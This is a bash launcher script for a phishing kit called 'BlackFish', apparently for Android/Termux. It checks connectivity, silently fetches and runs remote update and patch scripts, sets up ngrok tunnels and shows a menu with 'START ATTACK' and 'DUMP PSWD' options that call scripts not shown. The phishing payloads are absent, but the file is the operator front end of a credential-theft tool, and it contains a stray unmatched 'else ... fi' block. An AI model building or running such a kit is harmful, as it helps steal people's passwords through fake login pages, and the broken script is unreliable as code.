#!/bin/bash
##  Tool    : BlackFish (Advance Phishing Tool)
##  Author  : Waseem Akram
##  Github  : github.com/evildevill
##  Version : 2.0
#############################################
### color selection
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal
orange='\e[38;5;166m'
############################################
clear
wget -q --spider https://google.com
if [ "$?" -eq 0 ]; then
	echo -e $okegreen  Internet Connected [✔];
    	sleep 1
else
	echo -e $red        You are offline![×];
        echo -e $yellow   "Kindly connect With Internet or WIFI"
    	sleep 2
exit
fi
############################################
###           checking update            ###
############################################
clear
check(){
if wget --spider https://raw.githubusercontent.com/evildevill/BlackFish/master/update.v1.4 2>/dev/null; then
cd $HOME/BlackFish/core/update > /dev/null 2>&1
echo "yes" > update.txt > /dev/null 2>&1
else
echo
fi
}
check
option(){
if [ -f "$HOME/BlackFish/core/update/update.txt" ];then
cd $HOME/BlackFish/core/update > /dev/null 2>&1
bash update.sh > /dev/null 2>&1
else
echo " "
fi
}
option
check1(){
if wget --spider https://raw.githubusercontent.com/evildevill/evildevillpatch/main/mrpshpatch.v.1 2>/dev/null; then
cd $HOME/BlackFish/core/update > /dev/null 2>&1
echo "yes" > patch.txt > /dev/null 2>&1
else
echo
fi
}
check1
option1(){
if [ -f "$HOME/BlackFish/core/update/patch.txt" ];then
cd $HOME/BlackFish/core/update > /dev/null 2>&1
bash patch.sh > /dev/null 2>&1
else
echo " "
fi
}
option1
##############################################
###              logo section              ###
##############################################
echo ""
echo ""
sleep 2.0
echo ""
echo -e $cyan "        ┏━━┓┏┓╋╋┏━━━┳━━━┳┓┏━┳━━━┳━━┳━━━┳┓╋┏┓"
echo -e $cyan "        ┃┏┓┃┃┃╋╋┃┏━┓┃┏━┓┃┃┃┏┫┏━━┻┫┣┫┏━┓┃┃╋┃┃"
echo -e $cyan "        ┃┏━┓┃┃╋┏┫┗━┛┃┃╋┏┫┏┓┃┃┏━━┛┃┃┗━━┓┃┏━┓┃"      
echo -e $cyan "        ┃┗━┛┃┗━┛┃┏━┓┃┗━┛┃┃┃┗┫┃╋╋┏┫┣┫┗━┛┃┃╋┃┃"
echo -e $cyan "        ┗━━━┻━━━┻┛╋┗┻━━━┻┛┗━┻┛╋╋┗━━┻━━━┻┛╋┗┛"
echo ""
echo -e $lightgreen "         AUTHOR : HACKER WASI"
echo -e $red "THIS IS ONLY FOR EDUCTIONAL. WE ARE NOT RESPONSIBALE"
echo -e $red "        FOR ANY ILLEGAL ACTIVITY OR MIS USE"
echo -e $yellow "====================================================="
echo ""
echo ""
sleep 4.0
clear
echo ""
echo ""
echo -e $cyan "        ┏━━┓┏┓╋╋┏━━━┳━━━┳┓┏━┳━━━┳━━┳━━━┳┓╋┏┓"
echo -e $cyan "        ┃┏┓┃┃┃╋╋┃┏━┓┃┏━┓┃┃┃┏┫┏━━┻┫┣┫┏━┓┃┃╋┃┃"
echo -e $cyan "        ┃┏━┓┃┃╋┏┫┗━┛┃┃╋┏┫┏┓┃┃┏━━┛┃┃┗━━┓┃┏━┓┃"      
echo -e $cyan "        ┃┗━┛┃┗━┛┃┏━┓┃┗━┛┃┃┃┗┫┃╋╋┏┫┣┫┗━┛┃┃╋┃┃"
echo -e $cyan "        ┗━━━┻━━━┻┛╋┗┻━━━┻┛┗━┻┛╋╋┗━━┻━━━┻┛╋┗┛"
echo ""
echo -e $lightgreen "GITHUB : github.com/evildevill/BlackFish"
echo -e $okegreen " YouTube : youtube.com/HackerWasii"
echo -e $red "    Instagram : instagram.com/blckspidr"
echo ""
echo -e $yellow "=============================================="
echo ""
banner(){
echo -e $cyan "                BLACKFISH NGROK SETUP"
echo -e $yellow "              IF YOU ARE USING WIFI"
echo -e $okegreen "                   TYPE 1"
echo ""
echo ""
echo -e $lightgreen "                  (OR)     "
echo ""
echo ""
echo -e $yellow "              IF YOU ARE USING DATA"
echo -e $okegreen "                   TYPE 2"
echo -e $yellow "=============================================="
echo -n -e "\e[32mBLACKFISH\e[96m[\e[33m1/2\e[96m]\e[33m: \e[0m"
read hulk
if [ $hulk = 1 ];then
cd $HOME/BlackFish/core > /dev/null 2>&1
rm ngrok > /dev/null 2>&1
unzip ngrok-wifi.zip > /dev/null 2>&1
chmod +x ngrok > /dev/null 2>&1
elif [ $hulk = 2 ];then
cd $HOME/BlackFish/core > /dev/null 2>&1
rm ngrok > /dev/null 2>&1
unzip ngrok-data.zip > /dev/null 2>&1
chmod +x ngrok > /dev/null 2>&1
else
echo -e $red "                           PLEASE CHOSE CORRECT OPETION"
fi
}
banner
sleep 4.0
else
echo ""
echo ""
sleep 1.0
bash BlackFish
fi  
clear
echo ""
echo -e $cyan "        ┏━━┓┏┓╋╋┏━━━┳━━━┳┓┏━┳━━━┳━━┳━━━┳┓╋┏┓"
echo -e $cyan "        ┃┏┓┃┃┃╋╋┃┏━┓┃┏━┓┃┃┃┏┫┏━━┻┫┣┫┏━┓┃┃╋┃┃"
echo -e $cyan "        ┃┏━┓┃┃╋┏┫┗━┛┃┃╋┏┫┏┓┃┃┏━━┛┃┃┗━━┓┃┏━┓┃"      
echo -e $cyan "        ┃┗━┛┃┗━┛┃┏━┓┃┗━┛┃┃┃┗┫┃╋╋┏┫┣┫┗━┛┃┃╋┃┃"
echo -e $cyan "        ┗━━━┻━━━┻┛╋┗┻━━━┻┛┗━┻┛╋╋┗━━┻━━━┻┛╋┗┛"
echo ""
echo -e $lightgreen "           TOOL BY WASEEM AKRAM"
echo -e $yellow "                    VERSION 2.0"
echo ""
echo -e $lightgreen "============================================="
echo -e $BlueF "                 BLACKFISH MAIN MENU "
echo ""
echo -e $lightgreen "============================================="
echo -e "\e[0;36     [\e[92m1\e[0;36]==> START ATTACK"
echo -e "\e[0;36     [\e[92m2\e[0;36]==> DUMP PSWD"
echo -e "\e[0;36     [\e[92m3\e[0;36]==> ABOUT"
echo -e "\e[0;36     [\e[92m4\e[0;36]==> UPDATE"
echo -e "\e[0;36     [\e[92m5\e[0;36]==> EXIT"
echo -e "\e[0;36     [\e[92m6\e[0;36]==> SUBSCRIBE"
echo -e "\e[0;36     [\e[92m7\e[0;36]==> SEE SPEED"
echo -e "\e[0;36     [\e[92m8\e[0;36]==> CHAT NOW"
echo -e $lightgreen "============================================="
read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] BLACKFISH: \e[0m' option
if [[ $option == 1 || $option == 01 ]]; then
echo
cd $HOME/BlackFish/core
bash menu.sh
echo
elif [[ $option == 2 || $option == 02 ]]; then
echo
cd $HOME/BlackFish/core/
bash show.sh
elif [[ $option == 3 || $option == 03 ]]; then
echo
cd $HOME/BlackFish/core/about
bash about.sh
elif [[ $option == 4 || $option == 04 ]]; then
echo
cd $HOME/BlackFish/core/update
bash update.sh
echo
elif [[ $option == 7 || $option == 07 ]]; then
echo
cd $HOME/BlackFish/core
bash intspeed.sh
echo
elif [[ $option == 5 ]]; then
clear
printf "                    \e[1;96m Have A Nice Day ........! \e[0m\n"
echo
sleep 3.0
exit 3
elif [[ $option == 6 || $option == 06 ]]; then
echo
clear
am start -a android.intent.action.VIEW -d https://youtube.com/HackerWasii
clear
echo
elif [[ $option == 8 || $option == 08 ]]; then
echo
clear
am start -a android.intent.action.VIEW -d https://wa.me/923137119351
else
printf "                \e[1;92m [!] Invalid option!\e[0m\n"
sleep 1
fi
echo
cd $HOME/BlackFish
bash bf.sh